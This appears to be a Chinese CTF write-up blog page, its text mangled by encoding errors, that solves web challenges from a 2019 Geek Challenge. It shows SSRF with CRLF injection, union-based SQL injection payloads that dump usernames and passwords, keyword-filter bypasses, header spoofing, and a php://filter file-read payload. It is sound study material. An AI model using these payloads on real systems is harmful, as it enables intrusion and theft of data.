<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$password = <span class="string">"If I knew where I would die, I would never go there."</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $password);</span><br><span class="line">$count=intval(file_get_contents(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> $arr[$count];</span><br><span class="line"></span><br><span class="line">$count++;</span><br><span class="line">$file=fopen(<span class="string">"1.txt"</span>,<span class="string">"w+"</span>);</span><br><span class="line">fwrite($file,$count);</span><br><span class="line">fclose($file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.txt</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101124245849.png" alt="image-20191101124245849"></p>
<p>1.txtè¦æœ‰å¯å†™æƒé™</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101124431268.png" alt="image-20191101124431268"></p>
<h2 id="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹"><a href="#æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹"></a>æœåŠ¡ç«¯æ£€æµ‹ç³»ç»Ÿï¼šemmï¼Œè‡ªå·±çœ‹</h2><p>SSRFè¿˜æ²¡æœ‰å†™è¿‡é¢˜ç›®ï¼Œåˆ©ç”¨å¤ç°å­¦ä¹ ä¸€ä¸‹</p>
<p>é¦–å…ˆæœ‰ä¸ªadmin.php</p>
<p>ä½†è¦æ±‚127.0.0.1æ‰èƒ½è®¿é—®</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191211164956360.png" alt="image-20191211164956360"></p>
<p>æœ‰index.phpçš„æºç ï¼Œ</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191211164910208.png" alt="image-20191211164910208"></p>
<p>è¿™é‡Œåˆ©ç”¨index.php SSRFè®¿é—®admin.php</p>
<p>ä½†è¦ç»•è¿‡â€œ/anythingâ€</p>
<p>è¿™é‡Œå¯ä»¥æ„é€ url=<a href="http://127.0.0.1/admin.php?&amp;method=GET" target="_blank" rel="noopener">http://127.0.0.1/admin.php?&amp;method=GET</a></p>
<p>è¿™æ ·â€œ/anythingâ€ å°±æˆäº†ä¸€ä¸ªå‚æ•°</p>
<p>æ˜¾ç¤ºfailedæ˜¯å› ä¸ºé‡‡ç”¨GETè¯·æ±‚æ–¹å¼ï¼ŒæœåŠ¡ç«¯æ˜¯ä¸ä¼šè¿”å›Allowå¤´çš„ï¼Œè€Œä¸”è¿™é‡Œçš„SSRFæ²¡æœ‰å›æ˜¾ï¼Œåªæœ‰ä¸€ä¸ªæ˜¾ç¤ºå“åº”ä½“é•¿åº¦çš„è¯­å¥</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191211195729531.png" alt="image-20191211195729531"></p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sprintf</span>(<span class="string">"body length of $method%d"</span>, $body);</span><br></pre></td></tr></table></figure>

<p>è¿™å¥ $methodå¯æ§ï¼Œæ‰€ä»¥ä¼ å…¥%s% è¦†ç›–å %s%%d åŒç™¾åˆ†å·è¿”å›ä¸€ä¸ª%,ä½†è¿™æ—¶ %d å·²ç»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191211202422540.png" alt="image-20191211202422540"></p>
<p>å¾—åˆ°admin.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (@$_POST[<span class="string">"iwantflag"</span>] == <span class="string">"yes"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"only 127.0.0.1 can visit it"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…³äºHTTPå¤´</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">httpå¤´çš„æ ¼å¼ï¼š</span><br><span class="line"></span><br><span class="line">è¯·æ±‚æ–¹æ³• /è·¯å¾„ HTTP/ç‰ˆæœ¬</span><br><span class="line">å¤´å­—æ®µ: å€¼</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚ï¼š</span><br><span class="line">GET /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<p>httpå¤´éƒ¨çš„å„ä¸ªå­—æ®µä¹‹é—´ç”¨CRLF(\r\n)(%0d%0a)åˆ†å‰²<br>httpè¯·æ±‚å¤´(å“åº”å¤´)å’Œè¯·æ±‚ä½“(å“åº”ä½“)ä¹‹é—´ç”¨ä¸¤ä¸ªCRLFåˆ†å‰²</p>
<p>å…³äºHttpè¯·æ±‚</p>
<p>getè¯·æ±‚:</p>
<pre><code>GET / HTTP/1.1
Host: 127.0.0.1</code></pre><p>postè¯·æ±‚</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-from-urlencoded
Content-Length: 3

x=1</code></pre><p>httpå¤´çš„å­—æ®µï¼ˆå¸¸è§ï¼‰<br>        Host</p>
<pre><code>ç”¨äºå¤šä¸ªåŸŸåæ˜ å°„åˆ°åŒä¸€ä¸ªipæ—¶ï¼ŒæŒ‰ç…§Hostçš„å†…å®¹åŒ¹é…ä¸åŒç½‘ç«™å†…å®¹ï¼Œæ¯ä¸ªHttpå¤´å¿…é¡»æœ‰Hostå¤´
å½“è¿™ä¸ªç›®çš„ä¸»æœºä¸Šåªæœ‰ä¸€ä¸ªç½‘ç«™ï¼Œé‚£ä¹ˆHostå­—æ®µå†…å®¹å¯ä»¥ä¸ºä»»æ„å€¼</code></pre><p>Content-Type</p>
<p>è¡¨æ˜å†…å®¹éƒ¨åˆ†çš„ç¼–ç æ ¼å¼å’Œåª’ä½“ç±»å‹ post/putç­‰æ–¹å¼å¿…é¡»æœ‰(å¦‚æœæœ‰è¯·æ±‚ä½“)</p>
<p>è¯·æ±‚å¤´ä¸­çš„Content-Type<br>GETè¯·æ±‚:<br>GETæ²¡æœ‰è¯·æ±‚å®ä½“éƒ¨åˆ†ï¼Œæ‰€ä»¥è¯·æ±‚å¤´ä¸­ä¸éœ€è¦è®¾ç½®Content-Typeå­—æ®µ<br>POST/PUTè¯·æ±‚<br>å¦‚æœpost/putè¯·æ±‚æœ‰è¯·æ±‚ä½“(æœ‰ä¼ å€¼)ï¼Œé‚£ä¹ˆå¿…é¡»è¦è®¾ç½®Content-Typeå­—æ®µ(å¦åˆ™æœåŠ¡ç«¯å¯èƒ½æ— æ³•å¤„ç†ä½ çš„è¯·æ±‚)</p>
<pre><code>ç¬¬ä¸€ç±»ï¼šrawåŸå§‹ç±»å‹ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„æ ¼å¼çš„æ–‡æœ¬ï¼Œæ¯”å¦‚textã€jsonã€xmlã€htmlâ€¦(ä¸­æ–‡ä¸è¿›è¡Œç¼–ç )
textè¯·æ±‚ï¼šContent-Type: text/plain
jsonè¯·æ±‚ï¼šContent-Type: application/json
htmlè¯·æ±‚ï¼šContent-Type: text/html
ç¬¬äºŒç±»ï¼šapplication/x-www-from-urlencodedï¼Œä¼šå°†è¡¨å•å†…çš„æ•°æ®è½¬æ¢æ‹¼æ¥æˆkey-valueå¯¹(å¯¹éasciiç è¿›è¡Œç¼–ç )
Content-Type: application/x-www-from-urlencoded
ç¬¬ä¸‰ç±»ï¼šmultipart/from-dataï¼Œå°†è¡¨å•çš„æ•°æ®å¤„ç†ä¸ºä¸€æ¡æ¶ˆæ¯ï¼Œä»¥æ ‡ç­¾ä¸ºå•å…ƒï¼Œç”¨åˆ†éš”ç¬¦åˆ†å¼€ã€‚æ—¢å¯ä»¥ä¸Šä¼ é”®å€¼å¯¹ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚
Content-Type: multipart/from-data;boundary=xxx
åœ¨è¯·æ±‚ä½“ä¸­ä¼šæœ‰ä¸€ä¸ªContent-Dispositionå­—æ®µï¼Œç”¨äºæè¿°æäº¤çš„è¡¨å•çš„å…·ä½“ä¿¡æ¯</code></pre><p>å“åº”å¤´ä¸­çš„Content-Typeï¼š<br> ç”¨æ¥å‘Šè¯‰å®¢æˆ·ç«¯ï¼ŒæœåŠ¡ç«¯è¿”å›çš„çœŸå®å†…å®¹ç±»å‹æ˜¯ä»€ä¹ˆã€‚æµè§ˆå™¨æˆ–å®¢æˆ·ç«¯ä¼šæ ¹æ®è¿™ä¸ªå€¼æ¥åšä¸€äº›æ“ä½œã€‚</p>
<p> Content-Length è¡¨ç¤ºå†…å®¹éƒ¨åˆ†çš„é•¿åº¦ post/putç­‰æ–¹å¼å¿…é¡»æœ‰(å¦‚æœæœ‰è¯·æ±‚ä½“)</p>
<p>åœ¨æºç ä¸­ä½¿ç”¨çš„æ˜¯stream_context_create()å‡½æ•°å‘èµ·HTTPè¯·æ±‚</p>
<p>è¿™é‡Œå¦‚httpåè®®å¤´ç­‰ä¸€äº›ä¿¡æ¯ï¼Œä½œä¸ºä¸€ä¸ªæ•°ç»„ä¼ å…¥ã€‚æ‰€ä»¥æˆ‘ä»¬èƒ½åˆ©ç”¨CRLFæ„é€ ä¸€ä¸ªæ–°çš„POSTåŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191212220127675.png" alt="image-20191212220127675"></p>
<p>è¿™é‡Œæˆ‘ä»¬æŠŠurlæ”¹æˆè‡ªå·±æœåŠ¡å™¨çš„ipï¼Œçœ‹çœ‹ç»è¿‡å¤„ç†åçš„POSTæ˜¯ä»€ä¹ˆæ ·å­ã€‚</p>
<p>è¿™ä¸ªPOSTåŒ…æœ€åä¹ŸåŠ ä¸Šäº†ä¸€äº›å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥ä¸ºäº†é˜²æ­¢iwantflagå‚æ•°è¢«æ±¡æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°b</p>
<p>è€Œä¸”ä¸ºäº†ä»index.phpå¾—åˆ°å›æ˜¾ï¼Œæˆ‘ä»¬ä¾æ—§è¦è¦†ç›– %d æ‰€ä»¥id=%s% </p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œ&amp;åœ¨URLä¸­æ˜¯å…·æœ‰åˆ†å‰²å‚æ•°çš„ä½œç”¨ï¼Œæ‰€ä»¥è¦è¿›è¡ŒURLç¼–ç </p>
<p>æœ€åçš„payloadå¦‚ä¸‹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191212074711793.png" alt="image-20191212074711793"></p>
<h2 id="Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼"><a href="#Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼" class="headerlink" title="Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼"></a>Lovelysqlï¼šä¸Šæ¬¡æ˜¯æˆ‘ç²—å¿ƒå¤§æ„ï¼Œçœ‹æ¥ä¸èƒ½ç›´æ¥æ”¾åœ¨ç½‘é¡µä¸Šäº†ï¼</h2><p>ç†Ÿæ‚‰çš„ç•Œé¢</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101125127520.png" alt="image-20191101125127520"></p>
<p>åŒæ ·çš„æ‰‹æ³•</p>
<figure class="highlight fix"><table><tr><td class="code"><pre><span class="line"><span class="attr">â€˜</span>=<span class="string">â€™</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">â€˜=â€™</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101201215464.png" alt="image-20191101201215464"></p>
<p>ä½†è¿™ä¸ªå­—ç¬¦ä¸²å¹¶ä¸æ˜¯flagï¼Œä¼°è®¡åœ¨æ•°æ®åº“ä¸­</p>
<p>åˆ©ç”¨Payloadæµ‹è¯•ï¼Œç¦ç”¨äº† insertï¼Œhavingç­‰ï¼Œå¯ä»¥åˆ©ç”¨<code>#</code> é—­åˆã€‚</p>
<p>å¯ä»¥è”åˆæ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œç›²æ³¨ã€‚</p>
<p>è¿™é‡Œç”¨æœ€ç®€å•çš„è”åˆæ³¨å…¥ã€‚</p>
<p>å…ˆåˆ¤æ–­å­—æ®µæ•°</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101202502733.png" alt="image-20191101202502733"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101202533747.png" alt="image-20191101202533747"></p>
<p>å­—æ®µæ•°ä¸º3</p>
<p>è·å–å›æ˜¾ç‚¹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101203249710.png" alt="image-20191101203249710"></p>
<p>è·å–æ•°æ®åº“å</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(schema_name)+from+information_schema.schemata%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101203821862.png" alt="image-20191101203821862"></p>
<p>å…ˆå…³æ³¨geekæ•°æ®åº“ï¼ŒæŸ¥è¡¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema%3d&apos;geek&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101204140891.png" alt="image-20191101204140891"></p>
<p>æŸ¥l0ve1ysq1è¡¨çš„å­—æ®µ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_schema%3d&apos;geek&apos;+and+table_name%3d&apos;l0ve1ysq1&apos;%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101204909589.png" alt="image-20191101204909589"></p>
<p>è·å–æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191101213948365.png" alt="image-20191101213948365"></p>
<h2 id="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©-å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼"><a href="#æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©-å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼" class="headerlink" title="æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©:å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼"></a>æ€§æ„Ÿé»„é˜¿å§¨ï¼Œåœ¨çº¿èŠå¤©:å¬è¯´å¥¹æœ‰å¾ˆå¤šå°ç§˜å¯†å’Œè¡¨æƒ…åŒ…å“¦ï¼Œå½“ç„¶ä¹Ÿæœ‰ä½ ä»¬æœ€æƒ³è¦çš„flagï¼</h2><p>bpæŠ“åŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031113746614.png" alt="image-20191031113746614"></p>
<p>å°è¯•æŠŠguestæ”¹æˆadmin</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031114019083.png" alt="image-20191031114019083"></p>
<p>æç¤ºæˆ‘ä»¬è¦ç»•è¿‡è¿™ä¸ªåˆ¤æ–­</p>
<p>ä¸¤ä¸ªç­‰å·ï¼Œç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯phpå¼±ç±»å‹</p>
<p>åˆ©ç”¨å­—ç¬¦ä¸²å’Œæ•°å­—çš„æ¯”è¾ƒå¼±ç‚¹</p>
<p>md5åŠ å¯†è‚¯å®šæ˜¯ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å­—æ¯è½¬åŒ–ä¸ºæ•°å­—åˆ™ä¸º0ï¼Œå¦‚æœå‰ä¸¤ä¸ªå­—ç¬¦æ˜¯â€œ1wâ€ï¼Œé‚£ä¹ˆè½¬åŒ–ä¸ºæ•°å­—åˆ™ä¸º1.</p>
<p>æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨nameä¼ è¾“æ•°å­—ï¼Œçˆ†ç ´md5($flag)å‰é¢çš„æ•°å­—å³å¯ç»•è¿‡ã€‚</p>
<p>åœ¨jsonä¸­ï¼Œâ€œnameâ€:â€0â€æ˜¯å­—ç¬¦ä¸²ï¼Œâ€nameâ€:0 æ˜¯æ•°å­—</p>
<p>é…ç½®æµ‹è¯•å™¨</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031115415135.png" alt="image-20191031115415135"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031115443975.png" alt="image-20191031115443975"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031115642982.png" alt="image-20191031115642982"></p>
<p>æ”¹æˆ<a href="https://4o4notfound.org/index.php/archives/29/" target="_blank" rel="noopener">xml</a>å½¢å¼ï¼ŒConnect-Typeæ”¹æˆxml</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031122255387.png" alt="image-20191031122255387"></p>
<p>åˆ©ç”¨PHP<a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" target="_blank" rel="noopener">ä¼ªåè®®</a>å’Œbase64åŠ å¯†è¯»å–æ–‡ä»¶å†…å®¹</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191031124114147.png" alt="image-20191031124114147"></p>
<p>base64è§£ç å¾—åˆ°flag</p>
<h2 id="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"><a href="#æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ" class="headerlink" title="æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ"></a>æä¸‰çš„ä»£ç å®¡è®¡ç¬”è®°ç¬¬äºŒé¡µ</h2><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œä¸‹è½½æºç </p>
<h2 id="Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼"><a href="#Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼" class="headerlink" title="Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼"></a>Babysqlï¼šæˆä¿¡å¤§çš„å­¦ç”ŸçœŸæ˜¯ä¸å¾—äº†ï¼Œè¿™ä¹ˆå¤šé»‘å®¢ï¼Œä¸è¿‡è¿™æ¬¡æˆ‘åšäº†é˜²å¾¡çš„ï¼</h2><p>ç»è¿‡æµ‹è¯•ä¸€äº›å…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œä½†é€šè¿‡åŒå†™å¯ä»¥ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username=-1&apos; oorrder bbyy 4-- &amp;password=123 //åˆ¤æ–­å­—æ®µ</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(schema_name)+frfromom+infoorrmation_schema.schemata%23&amp;password=123 //æŸ¥æ•°æ®åº“</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema%3d&apos;geek&apos;%23&amp;password=123  //æŸ¥è¡¨</span><br><span class="line"></span><br><span class="line">username=1%27ununionion+seselectlect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_schema%3d&apos;geek&apos;+aandnd+table_name%3d&apos;b4bsql&apos;%23&amp;password=123 //æŸ¥å­—æ®µ</span><br><span class="line"></span><br><span class="line">username=1%27union+select+1,2,group_concat(id,username,password)+from+geek.l0ve1ysq1+%23&amp;password=123   //è·å–æ•°æ®</span><br></pre></td></tr></table></figure>

<h2 id="ç¥ç§˜çš„ä¸‰å¶è‰"><a href="#ç¥ç§˜çš„ä¸‰å¶è‰" class="headerlink" title="ç¥ç§˜çš„ä¸‰å¶è‰"></a>ç¥ç§˜çš„ä¸‰å¶è‰</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029215131113.png" alt="image-20191029215131113"></p>
<p>æŸ¥çœ‹æºç ï¼Œå‘ç°Secret.php</p>
<p>æ‰“å¼€Secret.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029215545399.png" alt="image-20191029215545399"></p>
<p>ç›´æ¥BPæŠ“åŒ…ï¼Œä¿®æ”¹Refererå¤´</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029220046452.png" alt="image-20191029220046452"></p>
<p>æç¤ºä½¿ç”¨Sycloveræµè§ˆå™¨</p>
<p>ä¿®æ”¹UAå¤´</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029220217949.png" alt="image-20191029220217949"></p>
<p>æ¥ç€æç¤ºåªèƒ½æœ¬åœ°è¯»å–</p>
<p>ä¿®æ”¹XFFå¤´</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029220337766.png" alt="image-20191029220337766"></p>
<p>å¾—åˆ°flag</p>
<h2 id="Eval-evil-code-Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚"><a href="#Eval-evil-code-Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚" class="headerlink" title="Eval evil code: Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚"></a>Eval evil code: Lamberæ˜¯ä¸ªè€å®äººï¼Œä»–ä¼šæ‰§è¡Œä½ ç»™ä»–çš„ä»£ç ã€‚</h2><p>è¿™é‡Œæœ‰ä¸¤ä¸ªé™åˆ¶</p>
<p>ä¸€ã€æäº¤çš„æ¶æ„ä»£ç ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼ŒäºŒã€è¾“å…¥æ­£ç¡®çš„éªŒè¯ç </p>
<p>ç¬¬äºŒä¸ªå¥½è§£å†³ï¼Œç›´æ¥ç”¨md5<a href="https://0xcreed.jxustctf.top/2019/11/Md5Crack/">ç¢°æ’è„šæœ¬</a></p>
<p>ç¬¬ä¸€ä¸ªå°±è¦åˆ©ç”¨PHPçš„ä¸°å¯Œçš„å†…ç½®å‡½æ•°æ¥æ„é€ å‚æ•°ã€‚</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191111224322216.png" alt="image-20191111224322216"></p>
<p>æ¥ç€è¯»å–readflag.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191111224528382.png" alt="image-20191111224528382"></p>
<p>å‚è€ƒskysecçš„<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">æ–‡ç« </a></p>
<h2 id="Jiangâ€˜s-Secret-æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼"><a href="#Jiangâ€˜s-Secret-æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼" class="headerlink" title="Jiangâ€˜s Secret:æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼"></a>Jiangâ€˜s Secret:æˆ‘åœ¨é‚£æ”¾äº†ä¸€ä¸ªç§˜å¯†ï¼</h2><p>æ‰“å¼€ä¸»é¡µ</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029231444787.png" alt="image-20191029231444787"></p>
<p>æŸ¥çœ‹æºç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029231426639.png" alt="image-20191029231426639"></p>
<p>è®¿é—®Archive_room.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029231626206.png" alt="image-20191029231626206"></p>
<p>ç‚¹å‡»SECRET</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029231659829.png" alt="image-20191029231659829"></p>
<p>å°è¯•BPæŠ“åŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029231743833.png" alt="image-20191029231743833"></p>
<p>è®¿é—®secr3t.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029231920584.png" alt="image-20191029231920584"></p>
<p>ç®€å•çš„ä»£ç å®¡è®¡</p>
<p>ç›´æ¥file=flag.php</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029232108090.png" alt="image-20191029232108090"></p>
<p>æ— æ³•ç›´æ¥è¯»å–flag.phpæ–‡ä»¶</p>
<p>åˆ©ç”¨phpä¼ªåè®®</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029232338502.png" alt="image-20191029232338502"></p>
<p>base64è§£ç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191029232357758.png" alt="image-20191029232357758"></p>
